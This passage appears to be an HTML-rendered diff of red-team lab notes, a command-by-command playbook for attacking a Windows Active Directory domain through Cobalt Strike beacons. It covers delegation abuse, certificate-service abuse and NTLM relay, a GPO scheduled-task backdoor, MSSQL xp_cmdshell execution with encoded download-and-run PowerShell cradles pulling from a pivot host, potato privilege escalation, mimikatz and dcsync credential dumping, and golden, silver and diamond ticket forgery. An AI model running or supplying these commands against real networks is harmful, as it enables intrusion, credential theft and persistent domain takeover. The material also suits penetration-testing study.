+beacon&gt; powershell ConvertFrom-SID S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">569305411</span>-<span class="hljs-number">121244042</span>-<span class="hljs-number">2357301523</span>-<span class="hljs-number">1107</span>
+
+<span class="hljs-number">3</span>. Next we will assign delegation rights to our computer by modifying the attribute of target system
+beacon&gt; powerpick Get-DomainComputer -Identity wkstn-<span class="hljs-number">2</span> -Properties objectSid
+beacon&gt; powerpick <span class="hljs-variable">$rsd</span> = <span class="hljs-built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="hljs-string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"</span>; <span class="hljs-variable">$rsdb</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$rsd</span>.BinaryLength); <span class="hljs-variable">$rsd</span>.GetBinaryForm(<span class="hljs-variable">$rsdb</span>, <span class="hljs-number">0</span>); Get-DomainComputer -Identity <span class="hljs-string">"dc-2"</span> | Set-DomainObject -Set @{<span class="hljs-string">'msDS-AllowedToActOnBehalfOfOtherIdentity'</span> = <span class="hljs-variable">$rsdb</span>} -Verbose
+
+<span class="hljs-number">4</span>. Verify the updated attribute
+beacon&gt; powerpick Get-DomainComputer -Identity <span class="hljs-string">"dc-2"</span> -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+
+<span class="hljs-number">5</span>. Get the TGT of our computer
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<span class="hljs-number">0</span>x3e4 /service:krbtgt /nowrap
+
+<span class="hljs-number">6</span>. Use S4U technique to get TGS <span class="hljs-keyword">for</span> target computer using our TGT
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-<span class="hljs-number">2</span>$ /impersonateuser:nlamb /msdsspn:cifs/dc-<span class="hljs-number">2</span>.dev.cyberbotic.io /ticket:doIFuD[...]<span class="hljs-number">5</span>JTw== /nowrap
+
+<span class="hljs-number">7</span>. Access the services
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
+
+beacon&gt; steal_token <span class="hljs-number">4092</span>
+beacon&gt; ls \\dc-<span class="hljs-number">2</span>.dev.cyberbotic.io\c$
+
+<span class="hljs-number">8</span> Remove the delegation rights
+beacon&gt; powerpick Get-DomainComputer -Identity dc-<span class="hljs-number">2</span> | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
+
+OR, Create Fake computer Account <span class="hljs-keyword">for</span> RBCD Attack
+
+<span class="hljs-number">9</span>. Check <span class="hljs-keyword">if</span> we have permission to create computer account (default allowed)
+beacon&gt; powerpick Get-DomainObject -Identity <span class="hljs-string">"DC=dev,DC=cyberbotic,DC=io"</span> -Properties ms-DS-MachineAccountQuota
+
+<span class="hljs-number">10</span>. Create a fake computer with random password (generate hash using Rubeus)
+beacon&gt; execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
+PS&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
+
+<span class="hljs-number">11</span>. Use the Hash to get TGT <span class="hljs-keyword">for</span> our fake computer, and rest of the steps remains same
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:<span class="hljs-number">7</span>A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
+
+</code></pre>
+<h3 class="code-line" data-line-start=919 data-line-end=920 ><a id="Active_Directory_Certificate_Services_919"></a>Active Directory Certificate Services</h3>
+<pre><code class="has-line-data" data-line-start="922" data-line-end="1015" class="language-powershell"><span class="hljs-comment"># Finding Certificate Authorities</span>
+beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
+
+<span class="hljs-comment"># Miconfigured Certificate template</span>
+beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
+
+<span class="hljs-comment"># Attack Case 1: _ENROLLEE_SUPPLIES_SUBJECT_</span>
+
+beacon&gt; getuid
+beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-<span class="hljs-number">2</span>.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
+
+ubuntu@DESKTOP-<span class="hljs-number">3</span>BSK7NO ~&gt; openssl pkcs12 <span class="hljs-operator">-in</span> cert.pem -keyex -CSP <span class="hljs-string">"Microsoft Enhanced Cryptographic Provider v1.0"</span> -export -out cert.pfx
+
+ubuntu@DESKTOP-<span class="hljs-number">3</span>BSK7NO ~&gt; cat cert.pfx | base64 -w <span class="hljs-number">0</span>
+
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap
+
+
+<span class="hljs-comment"># Attack Case 2 : NTLMRelay on CA web endpoint</span>
+
+<span class="hljs-comment"># NTLM Relaying to ADCS HTTP Endpoints</span>
+- Web <span class="hljs-keyword">End</span> point <span class="hljs-keyword">for</span> certificate services is at http[s]://&lt;hostname&gt;/certsrv.
+- Redirect the NTLM auth traffic using PrintSpool attack from DC to CA (<span class="hljs-keyword">if</span> services running on seperate system) to fetch the DC Certificate
+- But <span class="hljs-keyword">if</span> they are both running on same server then we can execute the attack targetting a system where unconstrained delegation (WEB) is allowed, and force it to authenticate with CA to capture its certificate
+- <span class="hljs-keyword">Do</span> the same setup <span class="hljs-keyword">for</span> ntlmrelayx and use print spooler to force DC/WEB to authenticate with wkstn2
+
+
+<span class="hljs-number">1</span>. Setup socks proxy (beacon session)
+beacon&gt; socks <span class="hljs-number">1080</span> socks5 disableNoAuth socks_user socks_password enableLogging
+
+<span class="hljs-number">2</span>. Setup Proxychains to use this proxy
+$ sudo vim /etc/proxychains.conf
+socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span> socks_user socks_password
+
+<span class="hljs-number">3</span>. Execute NTLMRelayx to target the certificate server endpoint
+attacker@ubuntu ~&gt; sudo proxychains ntlmrelayx.py -t https://<span class="hljs-number">10.10</span>.<span class="hljs-number">122.10</span>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
+
+<span class="hljs-number">4</span>. Setup reverse port forwarding (System shell)
+beacon&gt; rportfwd <span class="hljs-number">8445</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">445</span>
+
+<span class="hljs-number">5</span>. Upload PortBender driver and load its cna file (System shell)
+beacon&gt; cd C:\Windows\system32\drivers
+beacon&gt; upload C:\Tools\PortBender\WinDivert64.sys
+beacon&gt; PortBender redirect <span class="hljs-number">445</span> <span class="hljs-number">8445</span>
+
+<span class="hljs-number">6</span>. Use PrintSpool attack to force WEB (unconstrained) server to authenticate with wkstn <span class="hljs-number">2</span> (Domain Sesion)
+beacon&gt; execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe <span class="hljs-number">10.10</span>.<span class="hljs-number">122.30</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">123.102</span>
+
+<span class="hljs-number">7</span>. Use the Base64 encoded machine certificate obtained to get TGT of machine account
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /nowrap
+
+<span class="hljs-number">8</span>. Use the TGT ticket obtained <span class="hljs-keyword">for</span> S4U attack to get a service ticket
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-<span class="hljs-number">2</span>.dev.cyberbotic.io /user:dc-<span class="hljs-number">2</span>$ /ticket:doIFuj[...]lDLklP /nowrap
+
+<span class="hljs-number">9</span>. Inject the Service Ticket by creating a new sacrificial token
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=
+
+<span class="hljs-number">10</span>. Steal token and access the service
+beacon&gt; steal_token <span class="hljs-number">1234</span>
+beacon&gt; ls \\web.dev.cyberbotic.io\c$
+
+
+<span class="hljs-comment">## User and Computer Persistance</span>
+
+<span class="hljs-comment"># User Persistance</span>
+
+<span class="hljs-number">1</span>. Enumerate user certificate from their Personal Certificate store (execute from user session)
+beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
+
+<span class="hljs-number">2</span>. Export the certificate as DER and PFX file on disk
+beacon&gt; mimikatz crypto::certificates /export
+
+<span class="hljs-number">3</span>. Encode the PFX file to be used with Rubeus
+ubuntu@DESKTOP-<span class="hljs-number">3</span>BSK7NO ~&gt; cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w <span class="hljs-number">0</span>
+
+<span class="hljs-number">4</span>. Use certificate to request TGT <span class="hljs-keyword">for</span> the user (/enctype:aes256 - Better OPSEC)
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /enctype:aes256 /nowrap
+
+<span class="hljs-number">5</span>. <span class="hljs-keyword">if</span> certificate is not present then requst from his loggedin session and then follow above steps
+beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-<span class="hljs-number">2</span>.dev.cyberbotic.io\sub-ca /template:User
+
+<span class="hljs-comment"># Computer Persistance </span>
+
+<span class="hljs-number">1</span>. Export the machine certificate (requires elevated session)
+beacon&gt; mimikatz !crypto::certificates /systemstore:local_machine /export
+
+<span class="hljs-number">2</span>. Encode the certificate, and use it to get TGT <span class="hljs-keyword">for</span> machine account
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-<span class="hljs-number">1</span>$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap
+
+<span class="hljs-number">3</span>. <span class="hljs-keyword">If</span> machine certificate it not stored, we can requet it using Certify (/machine <span class="hljs-keyword">param</span> is required <span class="hljs-keyword">for</span> auto elevation to system privilege)
+beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-<span class="hljs-number">2</span>.dev.cyberbotic.io\sub-ca /template:Machine /machine
+
+</code></pre>
+<h3 class="code-line" data-line-start=1016 data-line-end=1017 ><a id="Group_Policy_1016"></a>Group Policy</h3>
+<pre><code class="has-line-data" data-line-start="1019" data-line-end="1079" class="language-powershell">
+<span class="hljs-comment"># Modify Existing GPO</span>
+
+<span class="hljs-number">1</span>. Identify GPO where current principal has modify rights
+beacon&gt; powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">"CreateChild|WriteProperty"</span> -and <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-string">"S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}"</span> }
+
+<span class="hljs-number">2</span>. Resolve GPOName, Path and SID of principal
+beacon&gt; powerpick Get-DomainGPO -Identity <span class="hljs-string">"CN={AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io"</span> | select displayName, gpcFileSysPath
+
+beacon&gt; powerpick ConvertFrom-SID S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">569305411</span>-<span class="hljs-number">121244042</span>-<span class="hljs-number">2357301523</span>-<span class="hljs-number">1107</span>
+
+beacon&gt; ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD2F58B9-<span class="hljs-number">97</span>A0-<span class="hljs-number">4</span>DBC-A535-B4ED36D5DD2F}
+
+<span class="hljs-number">3</span>. Identify the domain OU where the above GPO applies
+beacon&gt; powerpick Get-DomainOU -GPLink <span class="hljs-string">"{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}"</span> | select distinguishedName
+
+<span class="hljs-number">4</span>. Identify the systems under the given OU
+beacon&gt; powerpick Get-DomainComputer -SearchBase <span class="hljs-string">"OU=Workstations,DC=dev,DC=cyberbotic,DC=io"</span> | select dnsHostName
+
+<span class="hljs-number">5</span>. Setup a pivot listener(<span class="hljs-number">1234</span>) on the beacon, and download &amp; execute cradle pointing to pivot (<span class="hljs-number">80</span>)
+PS&gt; IEX ((<span class="hljs-built_in">new-object</span> net.webclient).downloadstring(<span class="hljs-string">"http://wkstn-2:8080/pivot"</span>))
+
+
+<span class="hljs-number">6</span>. Enable inbound traffic on Pivot Listener (<span class="hljs-number">1234</span>) and WebDrive by ports (<span class="hljs-number">8080</span>) (requires system access)
+beacon&gt; powerpick New-NetFirewallRule -DisplayName <span class="hljs-string">"Rule 1"</span> -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort <span class="hljs-number">1234</span>
+beacon&gt; powerpick New-NetFirewallRule -DisplayName <span class="hljs-string">"Rule 2"</span> -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort <span class="hljs-number">8080</span>
+
+<span class="hljs-number">7</span>. Setup port forwarding rule to accept the Payload Download request locally and forward to our team server 
+beacon&gt; rportfwd <span class="hljs-number">8080</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">80</span>
+
+<span class="hljs-number">8</span>. Use sharpGPOAbuse to add the backdoor (scheduled task) <span class="hljs-keyword">for</span> execution on targetted system
+beacon&gt; execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerTask --TaskName <span class="hljs-string">"Install Updates"</span> --Author NT AUTHORITY\SYSTEM --Command <span class="hljs-string">"C:\Windows\System32\cmd.exe"</span> --Arguments <span class="hljs-string">"/c powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAHAAaQB2AG8AdAAiACkAKQA="</span> --GPOName <span class="hljs-string">"Vulnerable GPO"</span>
+
+
+<span class="hljs-comment"># Create and Link new GPO</span>
+
+<span class="hljs-number">1</span>. Check the rights to create a new GPO <span class="hljs-keyword">in</span> Domain
+beacon&gt; powerpick Get-DomainObjectAcl -Identity <span class="hljs-string">"CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io"</span> -ResolveGUIDs | ? { <span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-operator">-eq</span> <span class="hljs-string">"Group-Policy-Container"</span> -and <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-contains</span> <span class="hljs-string">"CreateChild"</span> } | % { ConvertFrom-SID <span class="hljs-variable">$_</span>.SecurityIdentifier }
+
+<span class="hljs-number">2</span>. Find the OU where any principal has <span class="hljs-string">"Write gPlink Privilege"</span>
+beacon&gt; powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { <span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-operator">-eq</span> <span class="hljs-string">"GP-Link"</span> -and <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">"WriteProperty"</span> } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
+
+beacon&gt; powerpick ConvertFrom-SID S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">569305411</span>-<span class="hljs-number">121244042</span>-<span class="hljs-number">2357301523</span>-<span class="hljs-number">1107</span>
+DEV\Developers
+
+<span class="hljs-number">3</span>. Verify <span class="hljs-keyword">if</span> RSAT module is installed <span class="hljs-keyword">for</span> GPO abuse
+beacon&gt; powerpick Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
+
+<span class="hljs-number">4</span>. Create a new GPO &amp; configure it to execute attacker binary via Registry loaded from shared location
+beacon&gt; powerpick New-GPO -Name <span class="hljs-string">"Evil GPO"</span>
+
+beacon&gt; powerpick Find-DomainShare -CheckShareAccess
+beacon&gt; cd \\dc-<span class="hljs-number">2</span>\software
+beacon&gt; upload C:\Payloads\pivot.exe
+beacon&gt; powerpick Set-GPPrefRegistryValue -Name <span class="hljs-string">"Evil GPO"</span> -Context Computer -Action Create -Key <span class="hljs-string">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run"</span> -ValueName <span class="hljs-string">"Updater"</span> -Value <span class="hljs-string">"C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe"</span> -Type ExpandString
+
+<span class="hljs-number">5</span>. Link newly created GPO with OU
+beacon&gt; powerpick Get-GPO -Name <span class="hljs-string">"Evil GPO"</span> | New-GPLink -Target <span class="hljs-string">"OU=Workstations,DC=dev,DC=cyberbotic,DC=io"</span>
+
+</code></pre>
+<h3 class="code-line" data-line-start=1081 data-line-end=1082 ><a id="MSSQL_Servers_1081"></a>MSSQL Servers</h3>
+<pre><code class="has-line-data" data-line-start="1084" data-line-end="1134" class="language-powershell">
+<span class="hljs-comment"># Use PowerUpSQL for enumerating MS SQL Server instances</span>
+beacon&gt; powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
+beacon&gt; powerpick Get-SQLInstanceDomain
+
+<span class="hljs-comment"># Check access to DB instance with current user session</span>
+beacon&gt; powerpick Get-SQLConnectionTest -Instance <span class="hljs-string">"sql-2.dev.cyberbotic.io,1433"</span> | fl
+beacon&gt; powerpick Get-SQLServerInfo -Instance <span class="hljs-string">"sql-2.dev.cyberbotic.io,1433"</span>
+beacon&gt; powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { <span class="hljs-variable">$_</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">"Accessible"</span> } | Get-SQLServerInfo
+
+<span class="hljs-comment"># Query execution</span>
+beacon&gt; powerpick Get-SQLQuery -Instance <span class="hljs-string">"sql-2.dev.cyberbotic.io,1433"</span> -Query <span class="hljs-string">"select @@servername"</span>
+
+<span class="hljs-comment"># Command Execution</span>
+beacon&gt; powerpick Invoke-SQLOSCmd -Instance <span class="hljs-string">"sql-2.dev.cyberbotic.io,1433"</span> -Command <span class="hljs-string">"whoami"</span> -RawResults
+
+<span class="hljs-comment"># Interactive access and RCE (xp_cmdshell 0 means it is disabled, needs to be enabled)</span>
+ubuntu@DESKTOP-<span class="hljs-number">3</span>BSK7NO ~&gt; proxychains mssqlclient.py -windows-auth DEV/bfarmer@<span class="hljs-number">10.10</span>.<span class="hljs-number">122.25</span> -debug
+
+SQL&gt; EXEC xp_cmdshell <span class="hljs-string">'whoami'</span>;
+SQL&gt; SELECT value FROM sys.configurations WHERE name = <span class="hljs-string">'xp_cmdshell'</span>;
+SQL&gt; sp_configure <span class="hljs-string">'Show Advanced Options'</span>, <span class="hljs-number">1</span>; RECONFIGURE;
+SQL&gt; sp_configure <span class="hljs-string">'xp_cmdshell'</span>, <span class="hljs-number">1</span>; RECONFIGURE;
+
+SQL&gt; EXEC xp_cmdshell <span class="hljs-string">'powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBwAGkAdgBvAHQAIgApAA=='</span>;
+
+<span class="hljs-comment"># Lateral Movement (using DB Links)</span>
+beacon&gt; powerpick Get-SQLServerLink -Instance <span class="hljs-string">"sql-2.dev.cyberbotic.io,1433"</span>
+beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance <span class="hljs-string">"sql-2.dev.cyberbotic.io,1433"</span>
+beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance <span class="hljs-string">"sql-2.dev.cyberbotic.io,1433"</span> -Query <span class="hljs-string">"exec master..xp_cmdshell 'whoami'"</span>
+
+SQL&gt; SELECT * FROM master..sysservers;
+SQL&gt; SELECT * FROM OPENQUERY(<span class="hljs-string">"sql-1.cyberbotic.io"</span>, <span class="hljs-string">'select @@servername'</span>);
+SQL&gt; SELECT * FROM OPENQUERY(<span class="hljs-string">"sql-1.cyberbotic.io"</span>, <span class="hljs-string">'SELECT * FROM sys.configurations WHERE name = '</span><span class="hljs-string">'xp_cmdshell'</span><span class="hljs-string">''</span>);
+
+SQL&gt; EXEC(<span class="hljs-string">'sp_configure '</span><span class="hljs-string">'show advanced options'</span><span class="hljs-string">', 1; reconfigure;'</span>) AT [sql-<span class="hljs-number">1</span>.cyberbotic.io]
+SQL&gt; EXEC(<span class="hljs-string">'sp_configure '</span><span class="hljs-string">'xp_cmdshell'</span><span class="hljs-string">', 1; reconfigure;'</span>) AT [sql-<span class="hljs-number">1</span>.cyberbotic.io]
+
+SQL&gt; SELECT * FROM OPENQUERY(<span class="hljs-string">"sql-1.cyberbotic.io"</span>, <span class="hljs-string">'select @@servername; exec xp_cmdshell '</span><span class="hljs-string">'powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAyACIAKQA='</span><span class="hljs-string">''</span>)
+
+<span class="hljs-comment"># MSSQL PrivEsc - Service Account (SeImpersonate) to System </span>
+
+beacon&gt; getuid
+beacon&gt; shell whoami /priv
+beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
+
+beacon&gt; execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.<span class="hljs-number">0</span>\powershell.exe -a <span class="hljs-string">"-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHQAYwBwAC0AbABvAGMAYQBsACIAKQA="</span>
+
+beacon&gt; connect localhost <span class="hljs-number">4444</span>
+</code></pre>
+<h3 class="code-line" data-line-start=1135 data-line-end=1136 ><a id="Domain_Dominance_1135"></a>Domain Dominance</h3>
+<pre><code>psexec |  CIFS 
+winrm  |  HOST &amp; HTTP 
+dcsync (DCs only) | LDAP
+</code></pre>
+<pre><code class="has-line-data" data-line-start="1142" data-line-end="1210" class="language-powershell">
+<span class="hljs-comment"># Silver Ticket (offline)</span>
+
+<span class="hljs-number">1</span>. Fetch the kerberos ekeys using mimikatz
+beacon&gt; mimikatz !sekurlsa:ekeys
+
+<span class="hljs-number">2</span>. Generate the silver Ticket TGS offline using Rubeus (use /rc4 flag <span class="hljs-keyword">for</span> NTLM hash)
+PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-<span class="hljs-number">1</span>.dev.cyberbotic.io /aes256:c9e598cd2a9b08fe31936f2c1846a8365d85147f75b8000cbc90e3c9de50fcc7 /user:nlamb /domain:dev.cyberbotic.io /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">569305411</span>-<span class="hljs-number">121244042</span>-<span class="hljs-number">2357301523</span> /nowrap
+
+<span class="hljs-number">3</span>. Inject the ticket and Verify the access 
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=
+beacon&gt; steal_token <span class="hljs-number">5668</span>
+beacon&gt; ls \\wkstn-<span class="hljs-number">1</span>.dev.cyberbotic.io\c$
+
+
+<span class="hljs-comment"># Golden Ticket (offline)</span>
+
+<span class="hljs-number">1</span>. Fetch the NTLM/AES hash of krbtgt account
+beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt
+
+<span class="hljs-number">2</span>. Generate Golden ticket offline using Rubeus
+PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<span class="hljs-number">51</span>d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">569305411</span>-<span class="hljs-number">121244042</span>-<span class="hljs-number">2357301523</span> /nowrap
+
+<span class="hljs-number">3</span>. Inject golden ticket and gain acess
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
+
+beacon&gt; steal_token <span class="hljs-number">5060</span>
+beacon&gt; run klist
+beacon&gt; ls \\dc-<span class="hljs-number">2</span>.dev.cyberbotic.io\c$
+
+
+<span class="hljs-comment"># Diamond Ticket (online)</span>
+
+<span class="hljs-number">1</span>. Fetch the SID of Ticket User
+beacon&gt; powerpick ConvertTo-SID dev/nlamb
+
+<span class="hljs-number">2</span>. Create Diamond ticket (<span class="hljs-number">512</span> - Enterprise Group ID, krbkey - Hash of KRBRGT account)
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:<span class="hljs-number">1106</span> /groups:<span class="hljs-number">512</span> /krbkey:<span class="hljs-number">51</span>d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
+
+<span class="hljs-number">3</span>. Verify the specs of Diamond ticket vs Golden ticket
+PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=
+
+
+<span class="hljs-comment"># Forged certificates (DC or CA Server)</span>
+
+<span class="hljs-number">1</span>. Dump the Private Key and Certificate of CA (to be executed on DC/CA)
+beacon&gt; execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
+
+<span class="hljs-number">2</span>. Save the certificate <span class="hljs-keyword">in</span> .pem file and convert into pfx format using openssl
+ubuntu@DESKTOP-<span class="hljs-number">3</span>BSK7NO ~&gt; openssl pkcs12 <span class="hljs-operator">-in</span> cert.pem -keyex -CSP <span class="hljs-string">"Microsoft Enhanced Cryptographic Provider v1.0"</span> -export -out cert.pfx
+
+<span class="hljs-number">3</span>. Next, use the stolen CA cert to generate fake cert <span class="hljs-keyword">for</span> nlamb user
+PS C:\Users\Attacker&gt; C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject <span class="hljs-string">"CN=User"</span> --SubjectAltName <span class="hljs-string">"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="19777578747b597a607b7c6b7b766d707a377076">[email&#160;protected]</a>"</span> --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123
+
+<span class="hljs-number">4</span>. Encode the certificate
+ubuntu@DESKTOP-<span class="hljs-number">3</span>BSK7NO ~&gt; cat cert.pfx | base64 -w <span class="hljs-number">0</span>
+
+<span class="hljs-number">5</span>. Use the certificate to get TGT <span class="hljs-keyword">for</span> nlamb user
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap
+
+<span class="hljs-number">6</span>. Inject the ticket and access the service
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
+
+beacon&gt; steal_token <span class="hljs-number">5060</span>
+beacon&gt; run klist
+beacon&gt; ls \\dc-<span class="hljs-number">2</span>.dev.cyberbotic.io\c$
+
+</code></pre>
